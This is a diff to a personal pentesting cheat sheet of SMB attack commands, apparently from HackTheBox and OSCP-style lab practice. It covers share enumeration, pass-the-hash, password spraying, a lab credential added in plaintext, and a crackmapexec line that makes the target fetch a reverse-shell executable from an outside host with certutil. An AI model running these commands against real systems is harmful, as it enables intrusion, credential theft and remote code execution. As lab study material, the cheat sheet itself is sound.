@@ -271,33 +271,35 @@
 
 5. Username/Domain/No Pass: smbclient \\\\$ip\\Public -U sequel/root
 
-6. Username/password/Domain: smbclient -L \\\\&lt;IP&gt;\\C$ -U &lt;Domain&gt;/&lt;username&gt;%&lt;password&gt;
+6. Username/Password: smbclient //flight.htb/users -U svc_apache 'S@Ss!K@*t13'
 
-7. $smbclient -L myhost -U DOMAIN/user -W workgroup
+8. Username/password/Domain: smbclient -L \\\\&lt;IP&gt;\\C$ -U &lt;Domain&gt;/&lt;username&gt;%&lt;password&gt;
 
-8. Lists file with permissions: smbmap -H &lt;IP&gt;
+9. $smbclient -L myhost -U DOMAIN/user -W workgroup
 
-9. Downloading: smbget -R smb://&lt;IP&gt;/anonymous
+10. Lists file with permissions: smbmap -H &lt;IP&gt;
 
-10. type prompt off, recurse on -&gt; lets us download all the files using mget *
+11. Downloading: smbget -R smb://&lt;IP&gt;/anonymous
 
-11. Nmap Vuln Script: nmap --script "smb-vuln*" -p 139,445 &lt;IP&gt;
+12. type prompt off, recurse on -&gt; lets us download all the files using mget *
 
-12. crackmapexec smb &lt;IP&gt;
+13. Nmap Vuln Script: nmap --script "smb-vuln*" -p 139,445 &lt;IP&gt;
 
-13. Users: crackmapexec smb &lt;IP&gt; --users
+14. crackmapexec smb &lt;IP&gt;
 
-14. Shares: crackmapexec smb &lt;IP&gt; --shares
+15. Users: crackmapexec smb &lt;IP&gt; --users
 
-15. Try Crackmapexec, psexec, smbexec, wmiexec
+16. Shares: crackmapexec smb &lt;IP&gt; --shares
 
-16.  smbclient //10.20.85.111/Users -U SKYLARK/k.smith --pw-nt-hash d2a87ca4d6735870dc2357a83960c379
+17. Try Crackmapexec, psexec, smbexec, wmiexec
 
-17. impacket-smbclient  -hashes 00000000000000000000000000000000:d2a87ca4d6735870dc2357a83960c379 skylark/k.smith@10.20.109.111
+18.  smbclient //10.20.85.111/Users -U SKYLARK/k.smith --pw-nt-hash d2a87ca4d6735870dc2357a83960c379
 
-18. crackmapexec smb 10.20.109.111 -u backup_service -p It4Server -x 'certutil -urlcache -split -f “http://192.168.45.188:8000/110reverse.exe” C:\110reverse.exe'
+19. impacket-smbclient  -hashes 00000000000000000000000000000000:d2a87ca4d6735870dc2357a83960c379 skylark/k.smith@10.20.109.111
 
-19. crackmapexec smb $ip --shares -u usernames.txt -p passwords.txt --continue-on-success
+20. crackmapexec smb 10.20.109.111 -u backup_service -p It4Server -x 'certutil -urlcache -split -f “http://192.168.45.188:8000/110reverse.exe” C:\110reverse.exe'
+
+21. crackmapexec smb $ip --shares -u usernames.txt -p passwords.txt --continue-on-success
 
 </code></pre>
 <h4 id="if-we-have-username-and-password"><a class="header" href="#if-we-have-username-and-password">If we have Username and Password</a></h4>
